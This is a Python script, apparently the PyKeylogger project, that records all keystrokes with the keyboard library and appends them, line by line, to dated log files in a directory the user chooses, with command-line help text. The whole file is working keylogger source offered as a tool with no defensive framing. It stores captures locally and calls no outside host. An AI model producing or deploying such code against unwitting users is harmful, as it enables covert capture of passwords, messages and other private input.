import keyboard
import datetime
import sys
import getopt

global info
# Options
options = "ho:"
# Long options
long_options = ["help", "output ="]


def infos():
    global info
    info = True
    print("Keylogger.py\n"
          "OPTION\n"
          "-h   --help      <Show this page>\n"
          "-o   --output    <output-directory>\n"
          "\n"
          "EXAMPLES:\n"
          "Keylogger.py -o C:\\Users\Admin\Documents\logs \n"
          "Keylogger.py -h\n"
          "\n"
          "SEE THE MAN PAGE https://github.com/M0ShYy/PyKeylogger FOR MORE OPTIONS AND EXAMPLES\n")


def lines(out_dir):
    while True:
        logs = keyboard.record("enter", True, True)             # take every key until the enter key is pressed
        now = datetime.datetime.now()                           # date and time
        name_file = out_dir + "\log_" + str(now)[0:10]          # we keep juste te first characters (the date)
        outfile = open(name_file, "a")                          # create/open the file in append mode
        for item in logs:                                       # for every keystroke
            item = str(item)
            if "down" in item:                                  # if the key whas push DOWN
                item = item[14:-6]                              # item is just the key
                if item != "enter":                             # if the key is not enter
                    outfile.write(item)                         # you write it one the file
        outfile.write("\n")


def main(argumentlist):
    global info
    info = False
    output_dir= ""

    try:
        arguments, values = getopt.getopt(argumentlist, options, long_options)

        for currentArgument, currentValue in arguments:

            if currentArgument in ("-h", "--help"):         # test if there is -h or --help
                infos()                                     # print help
            elif currentArgument in ("-o", "--output "):    # test if there is -o --output
                output_dir = currentValue                   # take the value of the output-file

        if not info:                                        # if the help was not printed then
            lines(output_dir)
    except getopt.error as err:                             # if there is an error
        # output error, and return with an error code
        print(str(err))                                     # print it
        infos()                                             # and print the help
        sys.exit()


argumentList = (sys.argv[1:])                               # make a list of all the option wrote by the user
main(argumentList)
